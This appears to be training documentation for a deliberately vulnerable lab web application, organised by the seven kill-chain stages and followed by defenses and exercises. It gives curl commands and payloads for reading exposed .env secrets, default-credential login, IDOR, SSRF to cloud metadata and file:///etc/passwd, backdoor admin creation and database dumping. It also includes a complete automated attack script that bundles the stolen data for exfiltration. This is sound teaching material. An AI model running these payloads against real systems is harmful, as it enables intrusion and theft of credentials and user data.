# W Corp Cyber Range - Cyber Kill Chain Documentation

## Overview
This document outlines the complete cyber kill chain demonstration using the W Corp cyber range environment. The kill chain follows the traditional 7-stage model and demonstrates how attackers can exploit multiple vulnerabilities to achieve their objectives.

## Application Structure

- **Root URL:** `http://your-server/` - Landing page explaining the cyber range
- **Training Environment:** `http://your-server/wcorp/` - Main vulnerable application
- **API Endpoints:** `http://your-server/wcorp/api/*` - Backend API with vulnerabilities

## Cyber Kill Chain Stages

### 1. Reconnaissance
**Objective:** Gather information about the target system

**Techniques Demonstrated:**

- **Configuration Exposure:** `http://localhost:3000/.env`
  - Reveals database credentials
  - Exposes JWT secrets
  - Shows internal configuration

- **Package Information:** `http://localhost:3000/package.json`
  - Reveals technology stack
  - Shows dependency versions
  - Identifies potential vulnerabilities in packages

- **robots.txt Analysis:** `http://localhost:3000/robots.txt`
  - Reveals directory structure and sensitive paths
  - Exposes `/admin/`, `/api/`, `/uploads/`

- **Sitemap Analysis:** `http://localhost:3000/sitemap.xml`
  - Complete application structure mapped
  - API endpoints identified

- **HTML Source Code Analysis:** `http://localhost:3000/wcorp/`
  - Comments may reveal internal information
  - JavaScript files expose API endpoints
  - React source maps reveal application structure

**Tools Used:**
- Web browser developer tools
- curl/wget for automated reconnaissance
- Burp Suite for request interception

**Example Commands:**
```bash
# Gather basic information
curl http://localhost:3000/robots.txt
curl http://localhost:3000/sitemap.xml
curl http://localhost:3000/.env
curl http://localhost:3000/package.json

# Enumerate API endpoints
curl http://localhost:3000/wcorp/api/
```

### 2. Weaponization
**Objective:** Create attack vectors based on discovered vulnerabilities

**Attack Vectors Prepared:**

- **Authentication Bypass Payloads:**
  - Brute force credential lists
  - Default password attempts
  - Session hijacking techniques

- **IDOR Exploitation Parameters:**
  ```
  /wcorp/api/user/profile/1
  /wcorp/api/user/profile/2
  /wcorp/api/user/sensitive/1
  ```

- **Parameter Tampering Payloads:**
  ```json
  {"username":"attacker","password":"test","role":"admin"}
  {"id":1,"isAdmin":true}
  ```

- **SSRF Payloads:**
  ```
  http://localhost:3306
  http://169.254.169.254/latest/meta-data/
  file:///etc/passwd
  ```

### 3. Delivery
**Objective:** Deploy weaponized payloads to the target

**Delivery Methods:**

- **Direct API Calls:**
  ```bash
  # Authentication attempt
  curl -X POST http://localhost:3000/wcorp/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin123"}'
  ```

- **Malicious File Uploads:**
  ```bash
  # Upload potentially malicious file
  curl -X POST http://localhost:3000/wcorp/api/upload \
    -F "file=@malicious.txt" \
    -H "Authorization: Bearer <token>"
  ```

- **SSRF Requests:**
  ```bash
  # Attempt to access internal resources
  curl "http://localhost:3000/wcorp/api/fetch-url?url=http://localhost:3306"
  ```

### 4. Exploitation
**Objective:** Actively exploit discovered vulnerabilities

**Exploits Executed:**

**A. Broken Authentication:**
```bash
# Successful login with default credentials
curl -X POST http://localhost:3000/wcorp/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Response includes JWT token
# TOKEN=$(echo $response | jq -r '.token')
```

**B. Broken Access Control (IDOR):**
```bash
# Access admin profile as regular user
curl -H "Authorization: Bearer <token>" \
  http://localhost:3000/wcorp/api/user/profile/1

# Access sensitive data
curl -H "Authorization: Bearer <token>" \
  http://localhost:3000/wcorp/api/user/sensitive/1

# Access internal notes
curl -H "Authorization: Bearer <token>" \
  http://localhost:3000/wcorp/api/user/notes/1
```

**C. Security Misconfiguration:**
```bash
# Access exposed configuration
curl http://localhost:3000/.env

# Reveals:
# - DB_PASSWORD
# - JWT_SECRET
# - Database connection details
```

**D. Cryptographic Failures:**
```bash
# Query database to see plain text passwords
# (requires database access obtained through other means)
mysql -h localhost -u wcorp_user -p wcorp_db \
  -e "SELECT username, password FROM users;"
```

**E. SSRF Exploitation:**
```bash
# Access internal services
curl "http://localhost:3000/wcorp/api/fetch-url?url=http://localhost:3306"

# Attempt cloud metadata access (if deployed on cloud)
curl "http://localhost:3000/wcorp/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"
```

### 5. Installation
**Objective:** Establish persistent access to the system

**Persistence Techniques:**

**A. Create Backdoor Account:**
```bash
# Register new admin account through parameter tampering
curl -X POST http://localhost:3000/wcorp/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","password":"secret","email":"backdoor@test.com","role":"admin"}'
```

**B. Session Persistence:**
```bash
# Store valid authentication tokens
# Exploit long session timeouts
# Use discovered JWT secret to forge tokens
```

**C. Upload Backdoor Files:**
```bash
# Upload files to accessible uploads directory
curl -X POST http://localhost:3000/wcorp/api/upload \
  -F "file=@backdoor.html" \
  -H "Authorization: Bearer <token>"

# Access at http://localhost:3000/uploads/backdoor.html
```

### 6. Command & Control
**Objective:** Maintain communication and control over compromised assets

**C2 Techniques:**

**A. Administrative Access:**
```bash
# Use compromised admin credentials
# Access admin panel
curl -H "Authorization: Bearer <admin-token>" \
  http://localhost:3000/wcorp/admin
```

**B. API Abuse:**
```bash
# Use admin API endpoints
curl -H "Authorization: Bearer <admin-token>" \
  http://localhost:3000/wcorp/api/admin/users

curl -H "Authorization: Bearer <admin-token>" \
  http://localhost:3000/wcorp/api/admin/stats
```

**C. SSRF for Internal Access:**
```bash
# Use SSRF to pivot to internal network
curl "http://localhost:3000/wcorp/api/fetch-url?url=http://internal-service:8080"
```

### 7. Actions on Objectives
**Objective:** Achieve the ultimate goal of the attack

**Objectives Achieved:**

**A. Complete Data Exfiltration:**
```bash
# Extract all user data
curl -H "Authorization: Bearer <admin-token>" \
  http://localhost:3000/wcorp/api/admin/users > users.json

# Extract sensitive information
for id in {1..10}; do
  curl -H "Authorization: Bearer <token>" \
    http://localhost:3000/wcorp/api/user/sensitive/$id >> sensitive_data.json
done
```

**B. Database Compromise:**
```bash
# Using credentials from .env exposure
mysqldump -h localhost -u wcorp_user -p<password> wcorp_db > database_dump.sql

# Extract specific tables
mysql -h localhost -u wcorp_user -p<password> wcorp_db \
  -e "SELECT * FROM users;" > all_users.csv
```

**C. Privilege Escalation:**
```bash
# Modify own user role to admin
curl -X POST http://localhost:3000/wcorp/api/user/update \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"id":5,"role":"admin"}'
```

**D. System Reconnaissance:**
```bash
# Use SSRF to map internal network
for port in 22 80 443 3306 5432 6379 8080; do
  curl "http://localhost:3000/wcorp/api/fetch-url?url=http://localhost:$port"
done
```

## Complete Attack Chain Example

### Scenario: External Attacker to Full System Compromise

```bash
#!/bin/bash
# Complete attack automation script

TARGET="http://localhost:3000"

echo "[*] Stage 1: Reconnaissance"
curl -s $TARGET/robots.txt
curl -s $TARGET/.env > exposed_env.json
curl -s $TARGET/package.json > package.json

echo "[*] Stage 2: Weaponization"
# Prepare payloads based on reconnaissance
DB_PASSWORD=$(grep DB_PASSWORD exposed_env.json | cut -d'"' -f4)
JWT_SECRET=$(grep JWT_SECRET exposed_env.json | cut -d'"' -f4)

echo "[*] Stage 3: Delivery & Exploitation"
# Login with default credentials
TOKEN=$(curl -s -X POST $TARGET/wcorp/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')

echo "[*] Token obtained: $TOKEN"

echo "[*] Stage 4: IDOR Exploitation"
# Access all user profiles
for id in {1..10}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
    $TARGET/wcorp/api/user/profile/$id >> all_profiles.json
done

echo "[*] Stage 5: Sensitive Data Extraction"
# Extract sensitive information
for id in {1..10}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
    $TARGET/wcorp/api/user/sensitive/$id >> sensitive.json
done

echo "[*] Stage 6: Admin Access"
# Access admin endpoints
curl -s -H "Authorization: Bearer $TOKEN" \
  $TARGET/wcorp/api/admin/users > all_users.json

curl -s -H "Authorization: Bearer $TOKEN" \
  $TARGET/wcorp/api/admin/stats > stats.json

echo "[*] Stage 7: Data Exfiltration Complete"
# Compress and exfiltrate
tar -czf exfiltrated_data.tar.gz *.json
echo "[*] Attack chain complete! Data saved to exfiltrated_data.tar.gz"
```

## Defense Strategies

### How to Prevent Each Stage

**1. Reconnaissance Prevention:**
- Remove or restrict access to configuration files
- Disable directory listing
- Remove sensitive comments from code
- Implement proper robots.txt without exposing sensitive paths
- Use security headers to prevent information disclosure

**2. Weaponization Mitigation:**
- Strong password policies
- Multi-factor authentication
- Rate limiting on authentication endpoints
- Input validation and sanitization

**3. Delivery Prevention:**
- Web Application Firewall (WAF)
- Input validation on all endpoints
- Content Security Policy (CSP)
- File upload restrictions

**4. Exploitation Prevention:**
- Proper authorization checks
- Password hashing (bcrypt, Argon2)
- Parameterized queries for SQL
- Session management best practices
- SSRF prevention through URL validation

**5. Installation Prevention:**
- Principle of least privilege
- File integrity monitoring
- Disable unnecessary file uploads
- Regular security audits

**6. Command & Control Prevention:**
- Network segmentation
- Egress filtering
- Anomaly detection
- Session timeout policies

**7. Actions on Objectives Prevention:**
- Data loss prevention (DLP)
- Database encryption
- Access logging and monitoring
- Regular security assessments

## Training Exercises

### Exercise 1: Basic Reconnaissance
1. Discover all publicly accessible endpoints
2. Extract configuration information
3. Map the application structure

### Exercise 2: Authentication Bypass
1. Identify authentication mechanisms
2. Test default credentials
3. Exploit weak authentication

### Exercise 3: IDOR Attack Chain
1. Login as a regular user
2. Enumerate user IDs
3. Access admin and other user data

### Exercise 4: Complete Kill Chain
1. Perform full reconnaissance
2. Exploit multiple vulnerabilities
3. Establish persistence
4. Extract sensitive data

## Conclusion

This cyber range demonstrates how multiple small vulnerabilities can be chained together to achieve complete system compromise. Each stage of the kill chain builds upon the previous one, showing the importance of defense in depth and comprehensive security practices.

**Key Takeaways:**
- No single vulnerability should exist in isolation
- Defense must address each kill chain stage
- Layered security controls are essential
- Regular security testing is crucial
- Security awareness training is vital

**Remember:** This environment is for educational purposes only. Always practice ethical hacking and obtain proper authorization before testing any systems.